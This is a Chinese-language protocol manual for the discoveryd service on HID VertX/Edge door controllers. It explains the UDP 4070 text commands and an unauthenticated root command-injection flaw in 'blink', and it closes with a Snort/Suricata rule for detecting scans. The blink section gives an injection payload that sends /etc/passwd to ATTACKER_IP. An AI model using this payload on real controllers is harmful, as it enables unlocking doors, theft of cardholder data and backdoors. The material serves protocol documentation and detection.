# HID VertX Edge — discoveryd 协议格式手册

## 1. 协议概述

HID VertX/Edge 门禁控制器使用 `discoveryd` 服务监听 UDP 4070 端口，接收纯文本协议指令。该协议设计极其简单，无认证机制（CVSS 10.0 命令注入漏洞）。

| 属性 | 内容 |
|------|------|
| 协议 | discoveryd（私有协议） |
| 传输层 | UDP |
| 默认端口 | 4070 |
| 报文格式 | ASCII 纯文本 |
| 认证 | 无（漏洞版本） |
| 平台 | Linux 嵌入式（VertX/Edge 控制器） |

---

## 2. 报文格式

discoveryd 协议为 **换行符分隔的纯文本命令**，格式如下：

```
<命令> [参数1] [参数2] ...\n
```

### 2.1 通用报文结构

```
+-------------+----------+---------+
| 命令字符串   | 空格分隔符 | 参数    |
+-------------+----------+---------+
| 字母/数字   | 0x20      | 可变    |
+-------------+----------+---------+
```

- 命令和参数之间使用空格分隔
- 每条指令以换行符 `\n`（0x0A）结束
- 响应同样为文本格式，以换行结束
- 无帧头、无长度字段、无校验

---

## 3. 命令列表

### 3.1 基础命令

| 命令 | 功能 | 示例 |
|------|------|------|
| `fp` | 指纹识别/Fingerprint | 获取设备名称和固件版本 |
| `discover` | 网络发现 | 发现子网内 HID 控制器 |
| `blink` | LED 闪烁 | 定位物理设备 |

### 3.2 fp (Fingerprint) 命令

**请求:**
```
fp\n
```

**响应示例:**
```
HID VertX EVO, Rev 2.2.4
```

### 3.3 discover 命令

**请求:**
```
discover\n
```

**响应示例:**
```
1 HID VertX EVO 00:1A:0B:XX:XX:XX 2.2.4
```

### 3.4 blink 命令（含命令注入漏洞）

**请求:**
```
blink <次数>\n
```

**正常示例:**
```
blink 3\n
```

**命令注入（漏洞利用）:**
```
blink `COMMAND`\n
```

控制器将反引号内的内容作为 shell 命令以 root 权限执行。例如:
```
blink `cat /etc/passwd > /dev/udp/ATTACKER_IP/4070`\n
```

## 4. 漏洞详情

| 属性 | 内容 |
|------|------|
| CVE | 未分配（通过 ZDI 报告） |
| CVSS | 10.0（Critical） |
| 漏洞类型 | 命令注入（未授权远程 root） |
| 发现者 | Ricky Lawshae（Trend Micro DVLabs, 2016） |
| 影响版本 | HID VertX 和 Edge 全系列 |
| 补丁 | 需通过 HID 合作伙伴门户获取 |

### 可利用操作

- 远程开/关锁（`unlock`/`lock`）
- 下载持卡人数据库
- 获取网络配置
- 持久化后门植入

## 5. IDS检测规则

Emerging Threats 提供 Snort/Suricata 检测规则，用于检测 UDP 4070 扫描行为：

```
alert udp $EXTERNAL_NET any -> $HOME_NET 4070
(msg:"ET SCAN HID VertX and Edge Door Controllers Discover";
content:"discover"; depth:20; sid:xxx;)
```
